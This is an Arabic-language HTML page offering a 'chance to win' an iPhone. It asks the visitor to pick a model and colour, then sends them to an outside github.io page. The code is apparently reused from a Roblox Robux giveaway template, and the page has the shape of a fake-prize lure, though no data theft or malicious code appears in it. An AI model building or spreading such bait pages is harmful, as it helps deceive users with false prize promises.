<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>forsa </title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">

<!-- خلفية الذرات 3D -->
<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
<style>
  :root{
    --accent:#7b2cff; --accent-dark:#5a1fd1;
    --radius:20px;
    --card-w:420px;
  }
  /* خلفية الذرات */
  #particles-js{position:fixed;inset:0;z-index:-1;background:#0d0017;} /* أسود غامق مائل بنفسجي */
  body{margin:0;font-family:Inter,sans-serif;display:grid;place-items:center;min-height:100vh}
  .card{
    width:min(var(--card-w),92vw); background:#fff; border-radius:20px;
    border:3px solid var(--accent); box-shadow:0 14px 30px rgba(123,44,255,.25);
    padding:28px 20px 34px; text-align:center; position:relative;
  }
  .brand-bar{
    position:absolute; left:50%; top:-30px; transform:translateX(-50%);
    background:#fff; border:3px solid var(--accent); border-radius:16px; padding:8px 18px;
    box-shadow:0 8px 20px rgba(123,44,255,.25);
  }
  .brand{height:34px}
  h1{margin:36px 0 18px}

  .label{font-weight:900; text-align:left; margin:14px 0 8px; letter-spacing:.06em}
  .select-wrap{
    display:flex;align-items:center;gap:10px;
    background:#f7f7fc;border:2px solid #e1e1ec;border-radius:20px;padding:10px 14px;
    transition:all .3s ease;
  }
  select{
    flex:1;border:0;outline:0;background:transparent;font-size:16px;
    appearance:none;cursor:pointer;
  }
  .select-wrap:focus-within{
    border-color:var(--accent);
    box-shadow:0 0 12px rgba(123,44,255,.6),0 0 24px rgba(123,44,255,.3);
    transform:scale(1.02);
  }

  .cta{
    margin-top:24px;width:100%;height:60px;border:0;border-radius:16px;
    background:linear-gradient(180deg,var(--accent),var(--accent-dark));
    color:#fff;font-weight:900;font-size:20px;cursor:pointer;box-shadow:0 12px 26px rgba(123,44,255,.4);
    transition:all .3s ease;
  }
  .cta:hover{transform:translateY(-2px);box-shadow:0 16px 30px rgba(123,44,255,.6);}
  .cta:disabled{opacity:.5;cursor:not-allowed}
</style>
</head>
<body>
<div id="particles-js"></div>

<section class="card">
  <div class="brand-bar">
  <img src="https://clipground.com/images/logo-apple-clipart-4.png" 
       alt="Roblox" class="brand">
</div>

  <h1>!فرصة للفوز</h1>

  <div class="label">اختر الاصدار :</div>
  <div class="select-wrap">
    <select id="username">
      <option value="">اختر ...</option>
      <option>iphone 15</option>
      <option>iphone 16</option>
      <option>iphone 17</option>
    </select>
  </div>

  <div class="label">اللون:</div>
  <div class="select-wrap">
    <select id="platform">
      <option value="">اختر اللون..</option>
      <option>الوردي</option>
      <option>البنفسجي</option>
      <option>الاخضر</option>
      <option>الازرق</option>
    </select>
  </div>

  <button id="continueBtn" class="cta" disabled>متابعة</button>
</section>

<script>
  /* تهيئة الذرات */
  particlesJS("particles-js",{
    particles:{number:{value:70,density:{enable:true,value_area:800}},
      color:{value:"#7b2cff"},shape:{type:"circle"},
      opacity:{value:.6,random:true},size:{value:4,random:true},
      line_linked:{enable:true,distance:150,color:"#7b2cff",opacity:.4,width:1},
      move:{enable:true,speed:2,direction:"none",out_mode:"out"}},
    interactivity:{detect_on:"canvas",
      events:{onhover:{enable:true,mode:"grab"},onclick:{enable:true,mode:"push"}},
      modes:{grab:{distance:140,line_linked:{opacity:.8}},push:{particles_nb:3}}},
    retina_detect:true
  });

  const DEFAULT_ROBUX = 1000;
  const u=document.getElementById('username');
  const p=document.getElementById('platform');
  const btn=document.getElementById('continueBtn');

  function validate(){ btn.disabled = !(u.value.trim().length>2 && p.value); }
  u.addEventListener('change',validate);
  p.addEventListener('change',validate);

  btn.addEventListener('click',()=>{
  const name=u.value.trim();
  const platform=p.value;
  localStorage.setItem('rbx_entry', JSON.stringify({u:name,p:platform,r:DEFAULT_ROBUX}));
  location.href="https://gnesvas.github.io/chjan2/"; // 🔗 الرابط الجديد
});

</script>
</body>
</html>
